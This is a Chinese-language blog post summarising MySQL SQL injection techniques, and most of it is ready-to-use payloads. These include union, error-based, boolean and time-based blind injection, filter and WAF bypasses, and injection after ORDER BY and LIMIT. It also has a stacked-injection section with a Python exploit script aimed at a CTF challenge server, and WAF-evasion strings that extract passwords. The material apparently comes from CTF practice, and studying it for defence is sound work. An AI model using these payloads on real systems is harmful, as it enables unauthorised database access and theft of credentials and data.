---
title: SQL注入研究总结篇
date: 2019-02-18 19:02:51
tags:
- SQL注入
- 总结
---
整理成为一个流程，这样以后帮助会很大, 以后慢慢也会继续添加内容.

# 更新
19.3.8->根据TAMUCTF2019的BirdBox更新布尔注入的探测payload:`' OR 1=1;-- -`  
19.5.28->增加堆叠注入、Polygon爆错

# 总结

**运算符号**  
`_`代表空格
```sql
 - + * /(div) %(mod) 
 = <>(!=) > < <= >= between not_between in not_in <=> like regexp rlike is_null is_not_null
 not(!) and or xor & | ^ << >> ~
```
**符号优先级别**
![](/images/19-2-18_SQL_语句总结1.png)

**注释符号**
```sql
%09 %0a  %0b %0c %0d %20 %a0 /**/
```
**特殊符号**
```sql
@`` {x key} 1.1 3e1 \N '' "" () emoji表情 @:=
```
**数据库内容**
```sql
create table users(
id int(10),
name varchar(50) not null
);
insert into users values(1,'j7ur8'),(2,'abc'),(3,'shirely'),(4,'apex');
```

**过滤手法**  
双写(oorr)，大小写，内联注释，编码，等价替换，用户变量
# select语句
```SQL
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

把上面的select语句整理如下
```SQL
select [
  all high_priority straight_join sql_small_result sql_cache
] * 
from TABLE
where #1#  
[having id>1] 
[union 
 [select id,3 from users] 
 [having id>3]
] 
[order by #2# 
  [asc] 
] 
[limit 0,4] 
#[procedure analyse()]#;
```
目前我认为来说主要注入点有3个，途中##标识的3个地方，分别`select`语句下是`where`处的注入、`order by`处的注入和`limit`处的注入。第3个从来没有碰到过...但是在p神的博客后看到，这个注入有点局限，高版本不能使用select子句查询了。  

## 1号注入点
where处的注入,最基本的到高级的是: union注入->报错注入->布尔注入->盲注

## union注入

union注入的条件是有回显.  
注入方法是先用`order by`判断列,记得用注释符号注释掉语句后面的内容,因为可能原先的sql语句也存在order by.  
假如有3列  

- 注入语句为:
```sql
union select 1,group_concat(schema_name),3 from information_schema.schemata
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=DATABSE
union select 1,group_concat(column_name),3 from information_schema.columns where table_name=TABLE
union select 1,PARAM,3 from DATABASE.TABLE
```

- 对于过滤了union可以使用如下方法
```sql
\nunion select 1,group_concat(schema_name),3 from information_schema.schemata
1.1union select 1,group_concat(schema_name),3 from information_schema.schemata
8e0union select 1,group_concat(schema_name),3 from information_schema.schemata
/*!50000union*/select 1,group_concat(schema_name),3 from information_schema.schemata
Union select 1,group_concat(schema_name),3 from information_schema.schemata
```

- 过滤了空格
```sql
\nunion(select(1),group_concat(schema_name),(3)from(information_schema.schemata));
select~1
select@1
select-1
select!1
select'1'
```

- 过滤了逗号的话,可以使用
```sql
union select * from ( (select 1)a join (select group_concat(schema_name) from information_schema.schemata)b join (select 3)c )
union select * from ( (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=DATABSE)b join (select 3)c )
union select * from ( (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=TABLE)b join (select 3)c )
union select * from ( (select 1)a join (select PARAM from DATABASE.TABLE)b join (select 3)c )
```
- 又过滤逗号又过滤空格
```sql
union(select*from(((select@1)a)join((select(group_concat(schema_name))from(information_schema.schemata))b)join((select@3)c)));
```
- 过滤了information_schema.tables(版本需要大于5.6)
```sql
union select * from ( (select 1)a join (select group_concat(table_name) from mysql.innodb_table_stats where database_name=schema() )b join (select 3)c )
```

- 在获取数据的最后一部,如果需要使用where进行判定而被过滤了where可以使用如下方法
```sql
union select PARAM from TABLE limit 1;
```

- 过滤了limit
```sql
union select PARAM from TABLE group by id having id=1;
```

- 过滤了having
```sql
unino select group_concat(PARAM) from TABLE;
```

- 不知道列名的情况下注入数据
```sql
union select 1,(select concat(`1`,0x3a,`2`) from (select 1,2 union select * from users)a limit 1,1);
```

## 报错注入

- floor,extractvalue,updatexml
```sql
select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
```

- 注入数据
```sql
select 1 from(select count(*),concat((select concat(0x7e,version(),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a;
select 1 from(select count(*),concat((select distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
select 1 from(select count(*),concat((select distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=TABLE LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
select 1 from(select count(*),concat((select distinct concat(0x7e,COLUMN,0x7e) FROM DATABSE.TABLE LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
```

- 过滤了information_schema
```sql
select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM mysql.innodb_index_stats where database_name=schema() LIMIT 0,1),floor(rand(0)*2))x from mysql.innodb_index_stats group by x)a;
```

- 过滤了rand函数
```sql
select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)
```

- group_concat有长度限制,如果过滤了limit
```sql
select username from users group by id having id=1;
```

- 一些其他报错手法
```sql
基于数据溢出
select (select(!x-~0)from(select(select user())x)a);
基于列名重复可以报错列名
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
select *  from(select * from TABLE a join TABLE b)c;
select *  from(select * from TABLE a join TABLE b using(COLUMN,COLUMN.....))c;
基于字段名
select * from user where ID=1 and Polygon(ID)
```

## 布尔注入和盲注

两种注入方法的区别其实就是一个回显是01一个回显是时间长短.
注入利用的主要是运算符号或和条件语句.
`_`代表空格

###  符号或语法
```sql
 - + * /(div) %(mod) 
 = <>(!=) > < <= >= between not_between in not_in <=> like regexp rlike is_null is_not_null
 not(!) and or xor & | ^ << >> ~
```

**和匹配相关的语法**  
参考：
- https://dev.mysql.com/doc/refman/8.0/en/regexp.html#function_regexp-like
```
like,rlike,regexp,not_regexp等
```
  
其中like的语法中`_`,`%`是通配符，可以匹配任何。但是`_`一旦超过匹配字符串的长度，就会匹配不到，`%`则没有数量限制。  
简单如下：
```sql
select 'aaa' like '___'; # 1
select 'aaa' like '____'; # 0
select 'aaa' like '%%%%'; # 1
select 'aaa' like '%%%%%'; #1
```


### 常规函数
**字符串截取函数**
```sql
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)
```

**字符串连接函数**
```sql
concat(version(),'|',user());
concat_ws('|',1,2,3)
group_concat(version(),'~')
```

**字符转换**
```
Char(49)
Hex('a')
Unhex(61)
```

### 探测payload
```
' OR 1=1;-- -
' OR 1=1;#
```

### 回显语句
```sql
if(x,x,x)
case when 条件1 then 结果1 else 结果2 end
case 条件0 when 条件1 then 结果1 else 结果2 end
and 判断语句 and sleep(5) # 如果判断语句错误就不会执行sleep(5)
or 判断语句 or sleep(5) # 如果语句正确就不执行sleep(5)

完整如下：
select(if((ascii('a')='97'),1,2));
select(case(ascii('a'))when(97)then(1)else(2)end);
select 1 and ascii('a')>96 and sleep(1);
select 0 or !ascii('a')>96 or sleep(1);  # 加一个!就会加快脚本的爆破速度。
```


## 2号注入点
2号注入点是`order by`后面的注入.
其注入方式有点类似于盲注和布尔注入.

### 注入语句有
```sql
if()
case when then else end
ifnull
rand
(select 1 regexp if())
updaetxml()
extractvalue()

完整如下：
select * from users order by 1 and If(ascii(substr(database(),1,1))=116,0,sleep(1));
(SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)
rand(ascii(left(database(),1))=116)
此处可以利用limit后面的注入procedure
1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"
```


## 3号注入点
limit后的注入
参见p神的[博客](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
- 语句:
```sql
LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```
高版本貌似不可以了,5.5.53第一句还可以,第二句不行. 5.7.24都不可以.

# insert语句
insert语法如下:
```SQL
INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
    [INTO] tbl_name
    [(col_name [, col_name] ...)]
    {VALUES | VALUE} (value_list) [, (value_list)] ...
    [ON DUPLICATE KEY UPDATE assignment_list]

INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
    [INTO] tbl_name
    SET assignment_list
    [ON DUPLICATE KEY UPDATE assignment_list]

INSERT [LOW_PRIORITY | HIGH_PRIORITY] [IGNORE]
    [INTO] tbl_name
    [(col_name [, col_name] ...)]
    SELECT ...
    [ON DUPLICATE KEY UPDATE assignment_list]

value:
    {expr | DEFAULT}

value_list:
    value [, value] ...

assignment:
    col_name = value

assignment_list:
    assignment [, assignment] ...
```

# update语句
update语法如下
```sql
UPDATE [LOW_PRIORITY] [IGNORE] table_reference
    SET assignment_list
    [WHERE where_condition]
    [ORDER BY ...]
    [LIMIT row_count]

UPDATE [LOW_PRIORITY] [IGNORE] table_references
    SET assignment_list
    [WHERE where_condition]

value:
    {expr | DEFAULT}

assignment:
    col_name = value

assignment_list:
    assignment [, assignment] ...
```

关于`insert`和`update`语句没有什么深入的理解, 也无法做出什么总结. 一般来说注入的点在`value`值里面.

知道的这方面的sql注入语句
```sql
单表的sql注入,获取本表的内容:
update users set username = 'j7ur8'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
update users set username = '0'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
```

# 堆叠注入
碰到过的实际案例是强网杯的`随便注`这道题目。题目过滤了select，所以基本以上所有的查询都不可行了，因此考虑了堆叠注入。
探测的语句：
```sql
1';show tables;#
#给了tables的回显就说明存在
```
据说堆叠注入是不会给回显的，但是当时这道题目提示的是开发与渗透同样重要....可能是开发做的有问题吧。

堆叠注入的基本语句
```sql
sEt @x=0x??????;
prEpare a from @x;
execute a;
```

## 堆叠注入的历史
以下为phith0n师傅在小密圈中的原话

> 那么PDO就一定能多句执行吗？  
> 在历史上的确是这样，2014年以前PHP底层将CLIENT_MULTI_STATEMENTS写死在源码里，有了这个flag，PDO Mysql客户端就是支持多句执行的，所以当时是无法在PHP层面禁用这个选项的。
> 但这个PR https://github.com/php/php-src/pull/896/files 修改了这一点，在PHP层面为PDO Mysql增加了一个新的属性PDO::MYSQL_ATTR_MULTI_STATEMENTS，你可以明确指定true或false，来选择是否启动多句执行。

> 默认情况下，这个选项的值是true，也就是默认支持多句执行。

> 这个选项是PHP 5.5.21、 PHP 5.6.5后引入的，也就说是，只要PHP是这两个版本以后的，就可以手工禁用掉多句执行了。如图：![](/images/19-6-9_SQL_SQL注入总结_堆叠注入的历史1.png)

强网杯的exp.py
```py
import requests
import binascii
s = 'insert into words values (1,(select group_concat(`flag`) from `1919810931114514` limit 0,1))'
# s = 'insert into 1919810931114514 values ("123456")'
# s = 'insert into words values (1,2)'
str_16 = binascii.b2a_hex(s.encode('utf-8'))
inject = str_16.decode()
print(f"http://49.4.15.125:31896/?inject=1';sEt @x=0x{inject};prEpare a from @x;execute a;")
s = requests.get(f"http://49.4.15.125:31896/?inject=1';sEt @x=0x{inject};prEpare a from @x;execute a;")
print(s.text)
```

# 宽字节注入：
- https://www.freebuf.com/column/165567.html

# 过狗方面

给点语句吧
```sql
id=3'/*!and*/ 2e1/**/=2e1--+
id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,database/**/(),4,5))--+
id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x74657374))--+
id=1 and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}
id=-11/*!union/*!select/*!1,(select/*!password/*!from/*!test.user limit 0,1),3*/
id=-11 union--+%0aselect 1,(select--+%0apassword from --%01%0atest.user limit 0,1),3
id=@a:=(select@b:=`username`from{a test.user}limit0,1)union--%0aselect'1',@a,3
id=-1/*!union--%01%0aselect1,password,3 from test.user*/
```